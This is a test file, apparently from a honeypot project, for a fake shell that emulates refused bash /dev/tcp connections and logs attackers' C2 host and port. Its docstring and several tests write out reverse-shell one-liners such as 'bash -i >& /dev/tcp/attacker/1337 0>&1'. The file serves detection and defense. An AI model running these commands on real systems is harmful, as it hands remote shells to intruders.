r"""/dev/tcp: the reverse shell, and what the box says about it.

Forty-third coherence sweep. bash opens /dev/tcp/HOST/PORT as a socket,
and that is how a reverse shell is written when there is no nc on the
box:

    bash -i >& /dev/tcp/attacker/1337 0>&1
    exec 3<>/dev/tcp/attacker/4444

Every one of those forms answered "No such file or directory" -- which
is what a shell *without* net redirections says: dash, or a bash built
with --disable-net-redirections. Debian's bash has them. So an actor
testing the shell learned it was not bash, and the destination of the
attempt -- a C2 address, the single most useful thing a reverse shell
hands us -- went unrecorded.

It is emulated as refused, never attempted. The honeypot does not open
outbound connections on an attacker's behalf, and a refused C2 is the
commonest real outcome anyway; the guest's own wording for a closed port
is reproduced exactly. Each attempt logs a net_redirect event carrying
host and port.

Four parsing faults had to be fixed for the idioms to reach that point:

  * `N<>path` fell into the plain `<` branch, which took ">path" as the
    filename, so `exec 3<>/dev/tcp/h/p` complained about a file called
    ">/dev/tcp/h/p".
  * `N>&M` had no case at all, so the `0>&1` that ends the one-liner was
    read as a redirect to a file named "&1" -- overwriting the socket
    target parsed a moment earlier and losing the whole reverse shell.
  * The outer scanner consumes `>file` and leaves the fd digit as a word,
    which exec then dispatched: "bash: 3: command not found".
  * `bash -i` reported "-i: No such file or directory", so the one-liner
    failed on the shell rather than on the socket -- which tells the
    actor more than the socket would.

Found and deliberately not fixed: redirections are applied as a set of
independent flags rather than left to right, so ordering between them is
lost. `echo x 1>&2 2>/dev/null` correctly keeps x -- fd1 is pointed at the
terminal before fd2 moves -- but the reverse, `echo x 2>/dev/null 1>&2`,
should drop x and does not. Getting that right means turning the scanner
into an ordered list of redirections, which is a sweep of its own rather
than something to bolt onto this one.

Reference measured on the guest, as root:

    echo hi > /dev/tcp/127.0.0.1/9
        bash: connect: Connection refused
        bash: line 1: /dev/tcp/127.0.0.1/9: Connection refused      rc 1
    cat < /dev/tcp/127.0.0.1/9                                      rc 1
    exec 3<>/dev/tcp/127.0.0.1/9                                    rc 1
    echo hi > /dev/udp/127.0.0.1/9      (silent, connectionless)    rc 0
    bash -i under a pipe:
        bash: cannot set terminal process group (N): Inappropriate ioctl...
        bash: no job control in this shell                          rc 0

Run from `honeypot/`, or on the guest.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fakeshell as fs                                          # noqa: E402

PASS, FAIL = [], []


def run(script):
    events = []
    s = fs.Shell(fs.VFS(), log=lambda **k: events.append(k),
                 peer="203.0.113.77")
    s.exec_mode = True
    out = s.run(script)
    err = "".join(s._err)
    s._err.clear()
    return (out + err), s.last_rc, events


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond:
        print("  FAIL %-46s %s" % (name, detail))


def eq(name, got, want):
    check(name, got == want, "want %r got %r" % (want, got))


def nets(events):
    return [e for e in events if e.get("event") == "net_redirect"]


# -- the connection is refused, in bash's words --------------------------

def t_write_to_tcp():
    out, rc, ev = run("echo hi > /dev/tcp/1.2.3.4/4444")
    check("connect line", "bash: connect: Connection refused" in out, out)
    check("target line",
          "/dev/tcp/1.2.3.4/4444: Connection refused" in out, out)
    check("not the wrong errno", "No such file" not in out, out)
    eq("rc 1", rc, 1)


def t_read_from_tcp():
    out, rc, ev = run("cat < /dev/tcp/8.8.8.8/53")
    check("refused", "Connection refused" in out, out)
    eq("rc 1", rc, 1)
    eq("logged", nets(ev)[0]["target"], "8.8.8.8:53")


def t_udp_is_silent():
    out, rc, ev = run("echo hi > /dev/udp/1.2.3.4/53")
    eq("no output", out.strip(), "")
    eq("rc 0", rc, 0)
    eq("still logged", nets(ev)[0]["target"], "1.2.3.4:53")


def t_nothing_is_actually_connected():
    """tunnelsink and this path both stay offline by construction."""
    import inspect
    src = inspect.getsource(fs.Shell._net_redirect)
    # Strip the docstring first: it says the word "socket" describing what
    # bash does, which the first version of this check tripped over.
    body = src.split('"""', 2)[-1]
    for bad in ("socket.", "connect(", "urlopen", "create_connection"):
        check("no %s in the handler body" % bad, bad not in body, body[:160])


# -- the idioms ----------------------------------------------------------

def t_the_one_liner():
    out, rc, ev = run("bash -i >& /dev/tcp/7.7.7.7/1337 0>&1")
    check("refused", "Connection refused" in out, out)
    eq("rc 1", rc, 1)
    eq("C2 captured", nets(ev)[0]["target"], "7.7.7.7:1337")
    eq("port recorded as a number", nets(ev)[0]["port"], 1337)


def t_the_exec_form():
    for spelling in ("exec 3<>/dev/tcp/1.2.3.4/4444",
                     "exec 3>/dev/tcp/1.2.3.4/4444"):
        out, rc, ev = run(spelling)
        check("no command-not-found: %s" % spelling,
              "command not found" not in out, out)
        check("refused: %s" % spelling, "Connection refused" in out, out)
        eq("logged: %s" % spelling, nets(ev)[0]["target"], "1.2.3.4:4444")


def t_sh_spelling():
    out, _rc, ev = run("sh -i >& /dev/tcp/9.9.9.9/443 0>&1")
    eq("also captured", nets(ev)[0]["target"], "9.9.9.9:443")


def t_bash_i_alone():
    out, rc, _ev = run("bash -i")
    check("job control warning", "no job control in this shell" in out, out)
    check("not a missing file", "No such file" not in out, out)
    eq("rc 0", rc, 0)


# -- ordinary redirection must be untouched ------------------------------

def t_plain_redirection_still_works():
    out, rc, _ = run("echo a > /tmp/z; cat /tmp/z")
    eq("write and read back", out.strip(), "a")
    out, _, _ = run("echo a > /tmp/z2; echo b >> /tmp/z2; cat /tmp/z2")
    eq("append", out.split(), ["a", "b"])
    out, _, _ = run("echo d > /tmp/in; cat < /tmp/in")
    eq("stdin from a file", out.strip(), "d")


def t_stream_merging_still_works():
    out, _, _ = run("{ echo out; ls /nope; } 2>&1 | wc -l")
    eq("2>&1 merges", out.strip(), "2")
    # Redirections apply left to right, so `1>&2 2>/dev/null` points fd1 at
    # the terminal *before* fd2 is moved: the guest prints x as well as
    # done. Asserting "done" alone would have had me break working code.
    out, _, _ = run("echo x 1>&2 2>/dev/null; echo done")
    eq("1>&2 then 2>/dev/null keeps both", sorted(out.split()),
       ["done", "x"])
    # Found and not fixed, see the note at the top: the reverse order,
    # `2>/dev/null 1>&2`, should drop x and does not.
    out, _, _ = run("echo x > /dev/null; echo done")
    eq("/dev/null swallows", out.strip(), "done")


def t_no_net_event_for_ordinary_files():
    _o, _rc, ev = run("echo a > /tmp/ordinary; cat /tmp/ordinary")
    eq("nothing logged", nets(ev), [])
    _o, _rc, ev = run("echo a > /dev/null")
    eq("nor for /dev/null", nets(ev), [])


def t_a_file_called_dev_tcp_something_else():
    """Only the three-part form is a socket."""
    _o, _rc, ev = run("mkdir -p /dev/tcpx; echo a > /dev/tcpx/f")
    eq("not a socket", nets(ev), [])


TESTS = [t_write_to_tcp, t_read_from_tcp, t_udp_is_silent,
         t_nothing_is_actually_connected, t_the_one_liner,
         t_the_exec_form, t_sh_spelling, t_bash_i_alone,
         t_plain_redirection_still_works, t_stream_merging_still_works,
         t_no_net_event_for_ordinary_files,
         t_a_file_called_dev_tcp_something_else]


def main():
    for t in TESTS:
        try:
            t()
        except Exception as exc:                              # noqa: BLE001
            check(t.__name__, False, "crashed: %r" % (exc,))
    print("passed %d, failed %d" % (len(PASS), len(FAIL)))
    if FAIL:
        print("failed: " + ", ".join(FAIL[:8]))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
